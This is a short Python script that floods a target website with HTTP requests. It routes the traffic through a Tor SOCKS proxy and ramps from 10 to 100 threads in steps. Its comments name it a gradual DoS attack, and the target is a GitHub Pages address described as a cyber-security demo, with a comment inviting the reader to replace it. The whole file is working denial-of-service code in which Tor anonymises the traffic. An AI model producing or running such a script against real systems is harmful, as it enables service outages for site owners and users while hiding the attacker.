import requests
import threading
import time
import signal

# Target URL
target_url = "https://fOuttaMyPaint.github.io/Cyber-Security-Demo-Website"  # Replace with your GitHub Pages URL

# Tor proxy settings
proxies = {
    'http': 'socks5h://localhost:9050',
    'https': 'socks5h://localhost:9050'
}

# Flag to control the running state of the threads
running = True

# Function to send requests
def send_requests():
    global running
    try:
        while running:
            response = requests.get(target_url, proxies=proxies)
            print(f"Request sent, status code: {response.status_code}")
            time.sleep(0.1)  # Slight delay to reduce overwhelming the target immediately
    except Exception as e:
        print(f"Error: {e}")

# Function to gradually scale up the attack
def gradual_dos_attack(initial_threads, max_threads, step, delay):
    global running
    current_threads = initial_threads
    while current_threads <= max_threads and running:
        threads = []
        print(f"Starting attack with {current_threads} threads")
        for i in range(current_threads):
            thread = threading.Thread(target=send_requests)
            thread.start()
            threads.append(thread)

        # Join threads to wait for completion (you can skip this if you want a continuous attack)
        for thread in threads:
            thread.join()

        time.sleep(delay)  # Wait before scaling up
        current_threads += step

# Signal handler for graceful shutdown
def signal_handler(sig, frame):
    global running
    print('Stopping the attack...')
    running = False

if __name__ == "__main__":
    # Set up signal handler for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Initial number of threads
    initial_threads = 10

    # Maximum number of threads
    max_threads = 100

    # Step to increase the number of threads
    step = 10

    # Delay between scaling steps in seconds
    delay = 30

    gradual_dos_attack(initial_threads, max_threads, step, delay)
    print('Attack stopped.')
